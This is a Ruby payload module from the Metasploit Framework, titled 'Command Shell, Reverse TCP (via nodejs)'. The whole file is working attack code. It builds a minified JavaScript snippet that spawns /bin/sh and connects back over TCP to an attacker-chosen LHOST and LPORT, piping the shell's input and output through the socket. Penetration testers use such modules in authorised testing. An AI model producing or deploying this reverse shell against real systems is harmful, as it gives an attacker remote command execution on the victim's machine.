##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##

require 'msf/core'
require 'msf/core/handler/reverse_tcp'
require 'msf/base/sessions/command_shell'

module Metasploit3

  include Msf::Payload::Single
  include Msf::Sessions::CommandShellOptions

  def initialize(info = {})
    super(merge_info(info,
      'Name'          => 'Command Shell, Reverse TCP (via nodejs)',
      'Description'   => 'Creates an interactive shell via nodejs',
      'Author'        => ['RageLtMan', 'joev'],
      'License'       => BSD_LICENSE,
      'Platform'      => 'js',
      'Arch'          => ARCH_NODEJS,
      'Handler'       => Msf::Handler::ReverseTcp,
      'Session'       => Msf::Sessions::CommandShell,
      'PayloadType'   => 'js',
      'Payload'       => { 'Offsets' => {}, 'Payload' => '' }
    ))
  end

  #
  # Constructs the payload
  #
  def generate
    # Future proof for PrependEncoder
    ret = super + command_string
    # For copy-paste to files or other sessions
    vprint_good(ret)
    return ret
  end

  #
  # Returns the JS string to use for execution
  #
  def command_string
    # Does anyone know of a concise way to tell if we're running on windows so that we spawn cmd?
    lhost = Rex::Socket.is_ipv6?(lhost) ? "[#{datastore['LHOST']}]" : datastore['LHOST']
    cmd   = <<EOS
(function(){
  var require = global.require || global.process.mainModule.constructor._load;
  if (!require) return;
  var net = require("net"),
      spawn = require("child_process").spawn,
      util = require("util"),
      sh = spawn("/bin/sh", []);
  var client = this;
  client.socket = net.connect(#{datastore['LPORT']}, "#{lhost}", function() {
    client.socket.pipe(sh.stdin);
    util.pump(sh.stdout, client.socket);
    util.pump(sh.stderr, client.socket);
  });
})();
EOS
    return "#{cmd.gsub("\n",'').gsub(/\s+/,' ').gsub(/[']/, '\\\\\'')}"
  end
end
